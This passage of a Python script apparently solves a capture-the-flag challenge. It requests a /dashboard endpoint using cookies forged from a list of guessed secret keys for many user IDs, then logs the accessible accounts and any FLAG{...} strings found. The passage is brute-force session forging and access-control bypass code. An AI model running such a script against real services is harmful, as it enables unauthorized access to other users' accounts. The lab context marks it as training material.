            response = requests.get(
                f"{BASE_URL}/dashboard",
                cookies=cookies,
                headers=headers,
                timeout=10
            )
            
            status = response.status_code
            content_length = len(response.text)
            
            # Check for FLAG pattern
            if 'FLAG{' in response.text:
                import re
                flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
                for flag in flag_matches:
                    print(f"[!] FLAG FOUND with secret '{secret}' for user_id {user_id}!")
                    print(f"[!] Flag: {flag}")
                    found_flags.append({
                        'secret': secret,
                        'user_id': user_id,
                        'flag': flag,
                        'response': response.text[:500]
                    })
            
            # Check for successful access (200 status)
            if status == 200:
                print(f"[+] SUCCESS: user_id={user_id} | Status: 200 | Length: {content_length}B")
                if user_id not in accessible_users:
                    accessible_users[user_id] = {
                        'secret': secret,
                        'response_preview': response.text[:300]
                    }
                
                # Print a preview of the response
                preview = response.text.replace('\n', ' ')[:200]
                print(f"[+] Response preview: {preview}...")
                
            elif status == 403:
                print(f"[-] Denied: user_id={user_id} | Status: 403 | Secret '{secret}' didn't work")
            elif status == 401:
                print(f"[-] Unauthorized: user_id={user_id} | Status: 401 | Invalid session")
            elif status == 404:
                print(f"[-] Not found: user_id={user_id} | Status: 404 | Endpoint doesn't exist")
                break  # No need to test more if endpoint doesn't exist
            else:
                print(f"[?] Unexpected: user_id={user_id} | Status: {status} | Length: {content_length}B")
                
        except requests.exceptions.Timeout:
            print(f"[-] Timeout: user_id={user_id} with secret '{secret}'")
        except Exception as e:
            print(f"[-] Error: user_id={user_id} | Error: {e}")

# Final Results Summary
print("\n" + "=" * 80)
print("FINAL RESULTS SUMMARY")
print("=" * 80)
print(f"\n[+] Total requests made: {total_requests}")
print(f"[+] Different secret keys tested: {len(SECRET_KEYS)}")
